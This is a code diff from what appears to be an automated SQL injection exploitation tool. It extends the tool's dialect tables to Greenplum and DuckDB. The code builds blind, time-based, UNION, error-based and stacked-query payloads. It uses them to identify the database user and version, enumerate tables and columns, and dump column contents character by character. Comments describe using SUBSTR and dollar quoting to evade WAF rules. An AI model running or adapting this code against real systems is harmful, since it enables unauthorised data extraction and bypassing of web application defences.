                     _cond = f"({expr}) ~ $${_pat}$$"
@@ -61508,7 +61718,9 @@ class Scanner:
                 # Check if string has at least N chars: ~ '^.{N-1}.' (any char at pos N)
                 # BUG-REGEX-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
                 # to the PG ~ operator branch for length detection.
-                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-REGEX-GREENPLUM-DUCKDB FIX: Greenplum/DuckDB also support PG ~ operator.
+                if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                             "Greenplum", "DuckDB"):
                     _len_cond = f"({query}) ~ '^{'.' * _n}'"
                 elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                     # BUG-REGEX-TIDB-MISSING FIX: add TiDB — uses MySQL REGEXP, same as MySQL/MariaDB.
@@ -61573,7 +61785,7 @@ class Scanner:
         # often allow ASCII(x)-N=0 because subtraction isn't a comparison.
         async def _extract_char_subtraction(query, pos):
             """Extract one char using subtraction: ASCII(c)-N=0. ~10 probes avg."""
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # BUG-SUB-TIDB-YG-REDSHIFT FIX: Added YugabyteDB and Amazon Redshift.
                 # Both are PostgreSQL-wire-compatible; ASCII() returns full Unicode
                 # code points (0..U+10FFFF) and SUBSTR() is the safer alias that
@@ -62428,7 +62640,7 @@ class Scanner:
             """
             # BUG-COLTYPE-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift —
             # both use identical information_schema.columns + current_schema() as PostgreSQL.
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 # current_schema() returns the active search_path schema for the session.
                 _tq = (f"SELECT data_type FROM information_schema.columns "
                        f"WHERE table_schema=current_schema() "
@@ -63032,6 +63244,8 @@ class Scanner:
                     # _fbbs_char_hi below to correctly identify them as 21-bit DBMSes.
                     "YugabyteDB":       f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
                     "Amazon Redshift":  f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "Greenplum": f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
+                    "DuckDB": f"ASCII(SUBSTRING(({q}) FROM {p} FOR 1))",
                     "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
                     "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
                     # BUG-FBS-TIDB-YG-REDSHIFT FIX: Added TiDB. TiDB is MySQL-wire-compatible
@@ -63114,7 +63328,7 @@ class Scanner:
                                else 21 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                                      "TiDB", "PostgreSQL",
                                                      "CockroachDB", "YugabyteDB",
-                                                     "Amazon Redshift")
+                                                     "Amazon Redshift", "Greenplum", "DuckDB")
                                else 8)  # BUG-FBS-MYSQL-PG-ORACLE-BITS FIX: Oracle→16, MySQL/PG→21; BUG-FBS-TIDB-YG-REDSHIFT FIX: added TiDB/YG/Redshift→21
                 _bits = []
                 for _bi in range(_fbs_n_bits - 1, -1, -1):  # high bit down to 0
@@ -63174,7 +63388,7 @@ class Scanner:
                                  else 1114111 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                                             "TiDB", "PostgreSQL",
                                                             "CockroachDB", "YugabyteDB",
-                                                            "Amazon Redshift")
+                                                            "Amazon Redshift", "Greenplum", "DuckDB")
                                  else 255)  # BUG-FBS-MYSQL-PG-ORACLE-BITS FIX: Oracle→65535, MySQL/PG→1114111; BUG-FBS-TIDB-YG-REDSHIFT FIX: added TiDB/YG/Redshift→1114111
                 if 32 <= _val <= _fbbs_char_hi:
                     LOG.info("[Inference] pos=%d bit-shift \u2192 %r (val=%d)", p, chr(_val), _val)
@@ -63201,6 +63415,8 @@ class Scanner:
                     # PostgreSQL. Using SUBSTR avoids the SUBSTRING keyword WAF rule.
                     "YugabyteDB":       f"ASCII(SUBSTR(({q}),{p},1))",
                     "Amazon Redshift":  f"ASCII(SUBSTR(({q}),{p},1))",
+                    "Greenplum": f"ASCII(SUBSTR(({q}),{p},1))",
+                    "DuckDB": f"ASCII(SUBSTR(({q}),{p},1))",
                     "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
                     "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
                     # BUG-FALLBACK-EQ-TIDB FIX: TiDB is MySQL-wire-compatible; ORD() returns
@@ -63268,7 +63484,8 @@ class Scanner:
                                  else 1114111 if _dbms in (
                                      "MySQL", "MariaDB", "TiDB",
                                      "PostgreSQL", "CockroachDB", "YugabyteDB",
-                                     "SQLite", "Amazon Redshift", "ClickHouse")
+                                     "SQLite", "Amazon Redshift", "ClickHouse",
+                                     "Greenplum", "DuckDB")
                                  else 255)
                 _order = (list(range(97, 123)) + list(range(65, 91)) +
                           list(range(48, 58)) + [95, 45, 46, 47, 64, 32] +
@@ -63389,6 +63606,8 @@ class Scanner:
                     "CockroachDB":      f"ASCII(SUBSTR(({q}),{p},1))",
                     "YugabyteDB":       f"ASCII(SUBSTR(({q}),{p},1))",
                     "Amazon Redshift":  f"ASCII(SUBSTR(({q}),{p},1))",
+                    "Greenplum": f"ASCII(SUBSTR(({q}),{p},1))",
+                    "DuckDB": f"ASCII(SUBSTR(({q}),{p},1))",
                     "MySQL":            f"ORD(SUBSTRING(({q}),{p},1))",
                     "MariaDB":          f"ORD(SUBSTRING(({q}),{p},1))",
                     "TiDB":             f"ORD(SUBSTRING(({q}),{p},1))",
@@ -63421,13 +63640,13 @@ class Scanner:
                            else 21 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                                  "TiDB", "PostgreSQL",
                                                  "CockroachDB", "YugabyteDB",
-                                                 "Amazon Redshift")
+                                                 "Amazon Redshift", "Greenplum", "DuckDB")
                            else 8)
                 _char_hi = (65535 if _dbms in ("MSSQL", "Sybase", "Oracle")
                             else 1114111 if _dbms in ("SQLite", "MySQL", "MariaDB",
                                                        "TiDB", "PostgreSQL",
                                                        "CockroachDB", "YugabyteDB",
-                                                       "Amazon Redshift")
+                                                       "Amazon Redshift", "Greenplum", "DuckDB")
                             else 255)
                 _bits = []
                 for _bi in range(_n_bits - 1, -1, -1):  # high bit first, down to bit 0
@@ -63542,6 +63761,8 @@ class Scanner:
                     "CockroachDB": f"ASCII(SUBSTR(({query}),1,1))",
                     "YugabyteDB": f"ASCII(SUBSTR(({query}),1,1))",
                     "Amazon Redshift": f"ASCII(SUBSTR(({query}),1,1))",
+                    "Greenplum": f"ASCII(SUBSTR(({query}),1,1))",
+                    "DuckDB": f"ASCII(SUBSTR(({query}),1,1))",
                     "MSSQL": f"UNICODE(SUBSTRING(({query}),1,1))",
                     "Sybase": f"UNICODE(SUBSTRING(({query}),1,1))",
                     "Oracle": f"ASCII(SUBSTR(({query}),1,1))",
@@ -63632,6 +63853,8 @@ class Scanner:
                             "CockroachDB": f"ASCII(SUBSTR(({query}),9999,1))",
                             "YugabyteDB": f"ASCII(SUBSTR(({query}),9999,1))",
                             "Amazon Redshift": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "Greenplum": f"ASCII(SUBSTR(({query}),9999,1))",
+                            "DuckDB": f"ASCII(SUBSTR(({query}),9999,1))",
                             "MSSQL": f"ISNULL(UNICODE(SUBSTRING(({query}),9999,1)),0)",
                             "Sybase": f"ISNULL(UNICODE(SUBSTRING(({query}),9999,1)),0)",
                             "Oracle": f"NVL(ASCII(SUBSTR(({query}),9999,1)),0)",
@@ -64343,6 +64566,8 @@ class Scanner:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
                         "MySQL":           "ISNULL(NULL)",
                         "MariaDB":         "ISNULL(NULL)",
                         "TiDB":            "ISNULL(NULL)",
@@ -64362,6 +64587,8 @@ class Scanner:
                         "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+                        "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
                         "MySQL":           "ISNULL(1e0)",
                         "MariaDB":         "ISNULL(1e0)",
                         "TiDB":            "ISNULL(1e0)",
@@ -64465,18 +64692,21 @@ class Scanner:
                    "Oracle":"SELECT banner FROM v$version WHERE ROWNUM=1","SQLite":"SELECT sqlite_version()",
                    "MariaDB":"SELECT VERSION()","TiDB":"SELECT TIDB_VERSION()","CockroachDB":"SELECT version()",
                    "YugabyteDB":"SELECT yb_server_version()","Amazon Redshift":"SELECT version()",
+                   "Greenplum":"SELECT version()","DuckDB":"SELECT version()",
                    "Sybase":"SELECT @@VERSION",
                    "DB2":"SELECT SERVICE_LEVEL FROM TABLE(SYSPROC.ENV_GET_INST_INFO())"}
             _DQ = {"PostgreSQL":"SELECT current_database()","MySQL":"SELECT database()","MSSQL":"SELECT DB_NAME()",
                    "Oracle":"SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual","SQLite":"SELECT 'main'",
                    "MariaDB":"SELECT database()","TiDB":"SELECT database()","CockroachDB":"SELECT current_database()",
                    "YugabyteDB":"SELECT current_database()","Amazon Redshift":"SELECT current_database()",
+                   "Greenplum":"SELECT current_database()","DuckDB":"SELECT current_database()",
                    "Sybase":"SELECT DB_NAME()",
                    "DB2":"SELECT CURRENT_SCHEMA FROM SYSIBM.SYSDUMMY1"}
             _UQ = {"PostgreSQL":"SELECT current_user","MySQL":"SELECT CURRENT_USER()","MSSQL":"SELECT SYSTEM_USER",
                    "Oracle":"SELECT USER FROM dual","SQLite":"SELECT 'admin'",
                    "MariaDB":"SELECT CURRENT_USER()","TiDB":"SELECT CURRENT_USER()","CockroachDB":"SELECT current_user",
                    "YugabyteDB":"SELECT current_user","Amazon Redshift":"SELECT current_user",
+                   "Greenplum":"SELECT current_user","DuckDB":"SELECT current_user",
                    "Sybase":"SELECT SUSER_NAME()",
                    "DB2":"SELECT CURRENT_USER FROM SYSIBM.SYSDUMMY1"}
             _aq = [("version", _VQ), ("database", _DQ), ("user", _UQ)]
@@ -64625,7 +64855,7 @@ class Scanner:
                     _npos = _sleep_m.start(2)
                     _pre = _body[:_npos]
                     _post = _body[_npos + len(_num):]
-                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                    if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                         _arith = f"([INFERENCE])::int*{_num}"
                     elif _dbms in ("MySQL", "MariaDB", "TiDB"):
                         # BUG-INFERENCE-REBUILD-ARITH-TIDB FIX: TiDB supports IF() like MySQL.
@@ -64716,6 +64946,8 @@ class Scanner:
                 "CockroachDB": ["SELECT current_role", "SELECT user", "SELECT current_user"],
                 "YugabyteDB":  ["SELECT current_role", "SELECT user", "SELECT current_user"],
                 "Amazon Redshift": ["SELECT current_user", "SELECT user"],
+                "Greenplum": ["SELECT current_user", "SELECT user"],
+                "DuckDB": ["SELECT current_user", "SELECT user"],
                 "MySQL":    ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
                              "SELECT user()", "SELECT current_user()"],
                 "MariaDB":  ["SELECT SUBSTRING_INDEX(USER(),'@',1)",
@@ -64737,6 +64969,8 @@ class Scanner:
                 "CockroachDB": ["SELECT current_catalog", "SELECT current_database()"],
                 "YugabyteDB":  ["SELECT current_catalog", "SELECT current_database()"],
                 "Amazon Redshift": ["SELECT current_database()"],
+                "Greenplum": ["SELECT current_database()"],
+                "DuckDB": ["SELECT current_database()"],
                 "MySQL":    ["SELECT database()", "SELECT schema()"],
                 "MariaDB":  ["SELECT database()", "SELECT schema()"],
                 "TiDB":     ["SELECT database()"],
@@ -64754,6 +64988,8 @@ class Scanner:
                 "CockroachDB": ["SELECT version()"],
                 "YugabyteDB":  ["SELECT version()"],
                 "Amazon Redshift": ["SELECT version()"],
+                "Greenplum": ["SELECT version()"],
+                "DuckDB": ["SELECT version()"],
                 "MySQL":    ["SELECT VERSION()", "SELECT @@version"],
                 "MariaDB":  ["SELECT VERSION()"],
                 "TiDB":     ["SELECT VERSION()"],
@@ -64958,7 +65194,9 @@ class Scanner:
             elif _dbms in ("MSSQL", "Sybase"):
                 _col_q = f"[{column}]"
                 _tbl_q = f"[{table}]"
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
+            # BUG-COLQUOTE-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB — both use double-quote identifiers.
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB", "SQLite",
                            "DB2", "Firebird", "SAP_HANA", "ClickHouse", "H2"):
                 _col_q = f'"{column}"'
                 _tbl_q = f'"{table}"'
@@ -64990,7 +65228,9 @@ class Scanner:
             elif _dbms in ("MSSQL", "Sybase"):
                 _null_safe_cq = _limit1(f"SELECT COALESCE(CAST({_col_q} AS NVARCHAR(MAX)),'') FROM {_tbl_q}")
             # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB/Amazon Redshift.
-            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-COLEXISTS-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB — both support CAST AS TEXT.
+            elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                           "Greenplum", "DuckDB"):
                 _null_safe_cq = _limit1(f"SELECT COALESCE(CAST({_col_q} AS TEXT),'') FROM {_tbl_q}")
             elif _dbms == "Oracle":
                 _null_safe_cq = _limit1(f"SELECT NVL(TO_CHAR({_col_q}),' ') FROM {_tbl_q}")
@@ -65029,7 +65269,7 @@ class Scanner:
             elif _dbms in ("MSSQL", "Sybase"):
                 _tbl_q = f"[{table}]"
             elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite", "DB2",
-                           "Firebird", "SAP_HANA", "ClickHouse", "H2"):
+                           "Firebird", "SAP_HANA", "ClickHouse", "H2", "Greenplum", "DuckDB"):
                 _tbl_q = f'"{table}"'
             else:
                 # Oracle: unquoted — Oracle uppercases unquoted names to match
@@ -65061,6 +65301,7 @@ class Scanner:
         _DB_QUERY = {
             "PostgreSQL": "SELECT current_catalog", "CockroachDB": "SELECT current_catalog",
             "YugabyteDB": "SELECT current_catalog", "Amazon Redshift": "SELECT current_catalog",
+            "Greenplum": "SELECT current_catalog", "DuckDB": "SELECT current_catalog",
             "MySQL": "SELECT database()", "MariaDB": "SELECT database()",
             "TiDB": "SELECT database()",  # BUG-DBQUERY-TIDB FIX
             "MSSQL": "SELECT db_name()", "Sybase": "SELECT db_name()",
@@ -65080,6 +65321,7 @@ class Scanner:
         _USER_QUERY = {
             "PostgreSQL": "SELECT current_user", "CockroachDB": "SELECT current_user",
             "YugabyteDB": "SELECT current_user", "Amazon Redshift": "SELECT current_user",
+            "Greenplum": "SELECT current_user", "DuckDB": "SELECT current_user",
             "MySQL": "SELECT current_user()", "MariaDB": "SELECT current_user()",
             "TiDB": "SELECT current_user()",  # BUG-USERQUERY-TIDB FIX
             "MSSQL": "SELECT system_user", "Sybase": "SELECT suser_name()",
@@ -65092,6 +65334,7 @@ class Scanner:
         _VER_QUERY = {
             "PostgreSQL": "SELECT version()", "CockroachDB": "SELECT version()",
             "YugabyteDB": "SELECT version()", "Amazon Redshift": "SELECT version()",
+            "Greenplum": "SELECT version()", "DuckDB": "SELECT version()",
             "MySQL": "SELECT version()", "MariaDB": "SELECT version()",
             "TiDB": "SELECT version()",  # BUG-VERQUERY-TIDB FIX
             # BUG-EXT-R10-A FIX: MSSQL @@VERSION returns a text type; using it bare or with
@@ -65309,7 +65552,9 @@ class Scanner:
             # BUG-DISCOVER-COLS-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift —
             # both use identical information_schema.columns + current_schema() as PostgreSQL.
             # Without this, both fell to `else: return []`, breaking all dump via inference.
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            # BUG-DISCOVER-COLS-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB (same PG catalog).
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                         "Greenplum", "DuckDB"):
                 # BUG-DISCOVER-COLUMNS-NO-SCHEMA-FILTER FIX: the original query had no
                 # table_schema filter. On multi-schema databases (common on PostgreSQL:
                 # public + auth + app schemas), multiple schemas can each have a table
@@ -65571,6 +65816,11 @@ class Scanner:
                 # are both PostgreSQL-wire-compatible and support pg_tables + current_schema().
                 "YugabyteDB": "SELECT tablename FROM pg_tables WHERE schemaname=current_schema()",
                 "Amazon Redshift": "SELECT tablename FROM pg_tables WHERE schemaname=current_schema()",
+                # BUG-DISCOVER-TABLES-GREENPLUM-DUCKDB FIX: add Greenplum and DuckDB to table discovery.
+                # Greenplum: PostgreSQL-wire-compatible; pg_tables + current_schema() valid.
+                # DuckDB: uses information_schema.tables (no pg_tables equivalent).
+                "Greenplum": "SELECT tablename FROM pg_tables WHERE schemaname=current_schema()",
+                "DuckDB": "SELECT table_name FROM information_schema.tables WHERE table_schema=current_schema()",
                 "MySQL": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
                 "MariaDB": "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
                 # BUG-DISCOVER-TABLES-TIDB FIX: TiDB is MySQL-wire-compatible; use database()
@@ -65681,7 +65931,9 @@ class Scanner:
                     _iq = f"{_tq} ORDER BY table_name LIMIT 1 OFFSET {i}"
                 # BUG-DISCOVER-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon
                 # Redshift — both support pg_tables + current_schema() + LIMIT/OFFSET.
-                elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+                # BUG-DISCOVER-TABLES-GREENPLUM FIX: Greenplum also uses pg_tables/tablename.
+                elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                               "Greenplum"):
                     # BUG-DISCOVER-TABLES-NO-ORDER FIX: same non-deterministic issue.
                     # pg_tables.tablename — column name used by ORDER BY.
                     _iq = f"{_tq} ORDER BY tablename LIMIT 1 OFFSET {i}"
@@ -65824,6 +66076,8 @@ class Scanner:
                 "YugabyteDB":  "SELECT yb_server_version()",
                 # BUG-INFVQ-REDSHIFT FIX: version() is valid for Redshift (PG-compat).
                 "Amazon Redshift": "SELECT version()",
+                "Greenplum": "SELECT version()",
+                "DuckDB": "SELECT version()",
                 "MySQL":       "SELECT VERSION()",
                 "MariaDB":     "SELECT VERSION()",
                 "MSSQL":       "SELECT @@VERSION",
@@ -65848,6 +66102,8 @@ class Scanner:
                 "YugabyteDB":  "SELECT current_database()",
                 # BUG-INFDQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible.
                 "Amazon Redshift": "SELECT current_database()",
+                "Greenplum": "SELECT current_database()",
+                "DuckDB": "SELECT current_database()",
                 "MySQL":       "SELECT database()",
                 "MariaDB":     "SELECT database()",
                 "MSSQL":       "SELECT DB_NAME()",
@@ -65868,6 +66124,8 @@ class Scanner:
                 "YugabyteDB":  "SELECT current_user",
                 # BUG-INFUQ-REDSHIFT FIX: Amazon Redshift is PG-wire-compatible; keyword form.
                 "Amazon Redshift": "SELECT current_user",
+                "Greenplum": "SELECT current_user",
+                "DuckDB": "SELECT current_user",
                 "MySQL":       "SELECT CURRENT_USER()",
                 "MariaDB":     "SELECT CURRENT_USER()",
                 "MSSQL":       "SELECT SYSTEM_USER",
@@ -65919,18 +66177,18 @@ class Scanner:
                         "SELECT session_user",
                         _INF_UQ.get(_dbms, "SELECT current_user"),
                         "(SELECT usename FROM pg_stat_activity WHERE pid=pg_backend_pid() LIMIT 1)",  # BUG-PGBACKENDPID-OID FIX: pg_backend_pid() returns PID not OID; pg_stat_activity gives current user
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") else [
                         _INF_UQ.get(_dbms, "SELECT current_user")]
                     _pg_db_alts = [
                         "SELECT current_catalog",                         # No 'database' in name
                         _INF_DQ.get(_dbms, "SELECT current_database()"),
                         "(SELECT datname FROM pg_database WHERE datistemplate=$$f$$::bool LIMIT 1)",
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") else [
                         _INF_DQ.get(_dbms, "SELECT current_database()")]
                     _pg_ver_alts = [
                         "SELECT current_setting($$server_version$$)",    # No 'version()' call
                         _INF_VQ.get(_dbms, "SELECT version()"),
-                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift") else [
+                    ] if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB") else [
                         _INF_VQ.get(_dbms, "SELECT version()")]
                     _inf_results_bw = {}
                     for _inf_label, _inf_alts in [
@@ -65956,6 +66214,7 @@ class Scanner:
                     # to the regex binary search fallback — both support PG's ~ operator.
                     if not _inf_results_bw and _dbms in ("PostgreSQL", "CockroachDB",
                                                           "YugabyteDB", "Amazon Redshift",
+                                                          "Greenplum", "DuckDB",
                                                           "MySQL", "MariaDB", "TiDB"):  # BUG-REGEX-TIDB FIX: TiDB supports REGEXP like MySQL
                         LOG.info("[Inference] Standard extraction empty — trying regex binary search")
                         for _rlabel, _ralts in [("user", _pg_user_alts), ("database", _pg_db_alts)]:
@@ -65985,7 +66244,7 @@ class Scanner:
                         # to the PG user-alternatives list — both support current_user / session_user.
                         _like_user_alts = (
                             ["user", "session_user", "current_user"]
-                            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift")
+                            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                             else [_INF_UQ.get(_dbms, "current_user")]
                         )
                         for _lq in _like_user_alts:
@@ -66011,7 +66270,7 @@ class Scanner:
                                             # and Amazon Redshift to the dollar-quoting branch.
                                             _lq_str = (f"{_lq} LIKE $${_pat}$$ ESCAPE '!'"
                                                        if _dbms in ("PostgreSQL", "CockroachDB",
-                                                                    "YugabyteDB", "Amazon Redshift")
+                                                                    "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                                                        else f"{_lq} LIKE '{_pat}' ESCAPE '!'")
                                         _lr = await _cached_eval(_lq_str)
                                         if _lr is None: break
@@ -66213,7 +66472,7 @@ class Scanner:
                         _col_q_inf = f"[{_cn}]"
                         _tbl_q_inf = f"[{_tbl}]"
                     elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
-                                   "DB2", "Firebird", "SAP_HANA", "ClickHouse", "H2"):
+                                   "DB2", "Firebird", "SAP_HANA", "ClickHouse", "H2", "Greenplum", "DuckDB"):
                         _col_q_inf = f'"{_cn}"'
                         _tbl_q_inf = f'"{_tbl}"'
                     else:
@@ -66369,7 +66628,9 @@ class Scanner:
                 ("version", "VERSION()")
             ]
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift.
-        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        # BUG-UNION-GREENPLUM-DUCKDB FIX: add Greenplum/DuckDB — both support same PG functions.
+        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift",
+                       "Greenplum", "DuckDB"):
             queries_to_extract = [
                 ("database", "current_database()"),
                 ("user", "current_user"),
@@ -66457,7 +66718,7 @@ class Scanner:
             def _ue_wrap(e): return f"'{_UE_SENT_S}'+CAST(({e}) AS NVARCHAR(MAX))+'{_UE_SENT_E}'"
         elif _dbms == "Oracle":
             def _ue_wrap(e): return f"'{_UE_SENT_S}'||TO_CHAR(({e}))||'{_UE_SENT_E}'"
-        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             def _ue_wrap(e): return f"'{_UE_SENT_S}'||CAST(({e}) AS TEXT)||'{_UE_SENT_E}'"
         elif _dbms == "SQLite":
             # SQLite uses || for concatenation and CAST AS TEXT
@@ -66897,7 +67158,7 @@ class Scanner:
                 ("; SELECT VERSION() as ver", "version"),
             ]
         # BUG-ERROR-ENUM-TABLES-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift.
-        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+        elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
             stacked_payloads = [
                 ("; SELECT current_database() as db", "database"),
                 ("; SELECT current_user as usr", "user"),
@@ -67552,6 +67813,8 @@ class Scanner:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1,2,3],1)=1",
             "MySQL":           "ISNULL(NULL)",
             "MariaDB":         "ISNULL(NULL)",
             "TiDB":            "ISNULL(NULL)",
@@ -67571,6 +67834,8 @@ class Scanner:
             "CockroachDB":     "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "YugabyteDB":      "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "Amazon Redshift": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "Greenplum": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
+            "DuckDB": "ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)~~LN(2.718)",
             "MySQL":           "ISNULL(1e0)",
             "MariaDB":         "ISNULL(1e0)",
             "TiDB":            "ISNULL(1e0)",
@@ -67731,7 +67996,7 @@ class Scanner:
             # BUG-DIRECT-QUOTE-YUGABYTEDB-REDSHIFT FIX: add YugabyteDB and Amazon Redshift
             # to the dollar-quoting branch — both are PG-wire-compatible and support $$
             # as an equivalent WAF-bypass alternative to single-quote string literals.
-            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift"):
+            if _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB"):
                 return f"$${val}$$"
             return "'" + val.replace("'", "''") + "'"
 
@@ -67767,7 +68032,7 @@ class Scanner:
             _de_str_char_hi = (65535  if _dbms in ("MSSQL", "Sybase")
                                else 1114111 if _dbms == "SQLite"
                                else 126   if _dbms in ("PostgreSQL", "CockroachDB",
-                                                        "YugabyteDB", "Amazon Redshift")
+                                                        "YugabyteDB", "Amazon Redshift", "Greenplum", "DuckDB")
                                else 255)
             # BUG-V62-DIRECT-PREFIX-COMPARISON FIX (CRITICAL, Req 7/16):
             # The original comparison was: `expr >= prefix + chr(mid+1)` — a string prefix
@@ -67884,6 +68149,8 @@ class Scanner:
             "YugabyteDB":  "current_catalog",
             # BUG-DIRECTEXPR-DBREDSHIFT FIX: Amazon Redshift is PG-wire-compatible; current_catalog works.
             "Amazon Redshift": "current_catalog",
+            "Greenplum": "current_catalog",
+            "DuckDB": "current_catalog",
             "MySQL":       "database()",
             "MariaDB":     "database()",
             "MSSQL":       "db_name()",
@@ -67934,6 +68201,8 @@ class Scanner:
             "YugabyteDB":  "current_role",
             # BUG-DIRECTEXPR-USERREDSHIFT FIX: Amazon Redshift is PG-wire-compatible; current_user works.
             "Amazon Redshift": "current_user",
+            "Greenplum": "current_user",
+            "DuckDB": "current_user",
             "MySQL":       "current_user()",
             "MariaDB":     "current_user()",
             "MSSQL":       "system_user",
@@ -67988,7 +68257,7 @@ class Scanner:
                     _col_q_de = f"[{_cn}]"
                     _tbl_q_de = f"[{_tbl}]"
                 elif _dbms in ("PostgreSQL", "CockroachDB", "YugabyteDB", "Amazon Redshift", "SQLite",
-                               "DB2", "Firebird", "SAP_HANA", "ClickHouse", "H2"):
+                               "DB2", "Firebird", "SAP_HANA", "ClickHouse", "H2", "Greenplum", "DuckDB"):
                     _col_q_de = f'"{_cn}"'
                     _tbl_q_de = f'"{_tbl}"'
                 else:
